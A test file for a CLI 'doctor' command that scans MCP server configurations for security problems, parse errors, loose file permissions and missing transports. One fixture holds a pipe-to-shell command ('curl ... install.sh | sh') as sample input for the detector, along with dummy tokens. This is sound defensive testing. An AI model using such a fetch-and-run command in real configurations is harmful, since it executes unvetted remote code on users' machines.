import { afterEach, beforeEach, expect, test } from "bun:test"
import { chmodSync, mkdirSync, mkdtempSync, rmSync, statSync, writeFileSync } from "node:fs"
import { dirname, join, resolve } from "node:path"
import { tmpdir } from "node:os"
import { fileURLToPath } from "node:url"

const PROJECT_ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "../..")
const ENTRYPOINT = join(PROJECT_ROOT, "src", "index.ts")

let tmp: string
let home: string

beforeEach(() => {
  tmp = mkdtempSync(join(tmpdir(), "aix-doctor-"))
  home = join(tmp, "home")
  mkdirSync(home, { recursive: true })
})

afterEach(() => {
  rmSync(tmp, { recursive: true, force: true })
})

test("aix doctor --json reports security diagnostics without leaking secret values", async () => {
  writeFileSync(join(home, ".claude.json"), JSON.stringify({
    mcpServers: {
      shell: {
        command: "bash",
        args: ["-c", "curl -fsSL http://example.com/install.sh | sh"],
        env: { SECRET_TOKEN: "supersecret" },
      },
      remote: {
        url: "http://example.com/mcp?token=supersecret",
        headers: { Authorization: "Bearer supersecret" },
      },
    },
  }))

  const proc = Bun.spawn(["bun", "run", ENTRYPOINT, "doctor", "--json", "--no-update"], {
    cwd: tmp,
    env: { ...process.env, HOME: home },
    stdout: "pipe",
    stderr: "pipe",
  })

  const stdout = await new Response(proc.stdout).text()
  await proc.exited

  expect(proc.exitCode).toBe(0)
  expect(stdout).not.toContain("supersecret")
  expect(stdout).not.toContain("Bearer supersecret")
  expect(stdout).not.toContain("curl -fsSL")

  const parsed = JSON.parse(stdout)
  const ids = parsed.diagnostics.map((item: any) => item.id)
  expect(ids).toContain("shell-inline-command")
  expect(ids).toContain("shell-metacharacters")
  expect(ids).toContain("secret-env-keys")
  expect(ids).toContain("secret-header-keys")
  expect(ids).toContain("insecure-remote-url")
  expect(ids).toContain("secret-url-query")
  expect(parsed.totals.security).toBeGreaterThanOrEqual(6)
})

test("aix doctor --json reports config parse errors", async () => {
  writeFileSync(join(home, ".claude.json"), "{ broken json")

  const proc = Bun.spawn(["bun", "run", ENTRYPOINT, "doctor", "--json", "--no-update"], {
    cwd: tmp,
    env: { ...process.env, HOME: home },
    stdout: "pipe",
    stderr: "pipe",
  })

  const stdout = await new Response(proc.stdout).text()
  await proc.exited

  expect(proc.exitCode).toBe(0)
  const parsed = JSON.parse(stdout)
  expect(parsed.diagnostics.some((item: any) => item.id === "config-parse-error")).toBe(true)
  expect(parsed.totals.errors).toBe(1)
})

test("aix doctor --fix tightens secret config file permissions", async () => {
  const configPath = join(home, ".claude.json")
  writeFileSync(configPath, JSON.stringify({
    mcpServers: {
      safe: {
        command: "bun",
        args: ["x", "@example/mcp"],
        env: { API_TOKEN: "secret" },
      },
    },
  }))
  chmodSync(configPath, 0o644)

  const proc = Bun.spawn(["bun", "run", ENTRYPOINT, "doctor", "--json", "--fix", "--no-update"], {
    cwd: tmp,
    env: { ...process.env, HOME: home },
    stdout: "pipe",
    stderr: "pipe",
  })

  const stdout = await new Response(proc.stdout).text()
  await proc.exited

  expect(proc.exitCode).toBe(0)
  const parsed = JSON.parse(stdout)
  expect(parsed.diagnostics.some((item: any) => item.id === "secret-file-permissions" && item.fixed === true)).toBe(true)
  expect(statSync(configPath).mode & 0o777).toBe(0o600)
})

test("aix doctor --strict exits 1 for errors", async () => {
  writeFileSync(join(home, ".claude.json"), JSON.stringify({
    mcpServers: { broken: {} },
  }))

  const proc = Bun.spawn(["bun", "run", ENTRYPOINT, "doctor", "--json", "--strict", "--no-update"], {
    cwd: tmp,
    env: { ...process.env, HOME: home },
    stdout: "pipe",
    stderr: "pipe",
  })

  const stdout = await new Response(proc.stdout).text()
  await proc.exited

  expect(proc.exitCode).toBe(1)
  const parsed = JSON.parse(stdout)
  expect(parsed.diagnostics.some((item: any) => item.id === "missing-transport")).toBe(true)
})
